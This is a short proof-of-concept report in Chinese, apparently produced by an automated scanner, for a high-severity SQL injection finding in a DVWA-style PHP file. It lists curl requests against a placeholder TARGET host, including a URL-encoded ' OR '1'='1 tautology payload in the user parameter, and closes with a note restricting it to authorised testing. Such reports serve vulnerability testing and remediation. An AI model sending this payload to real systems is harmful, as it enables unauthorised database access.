# POC — 008.php 第 7 行 dvwaCurrentUser() 拼接进 SQL 导致注入

- finding_id: `LLM-f5edf35e32f8`
- type: `sql_injection` / CWE-89
- severity: `high`
- file: `008.php:8`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/008.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 SQL 注入 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/008.php?user=%27%20OR%20%271%27%3D%271&Submit=Submit'
```
预期：布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。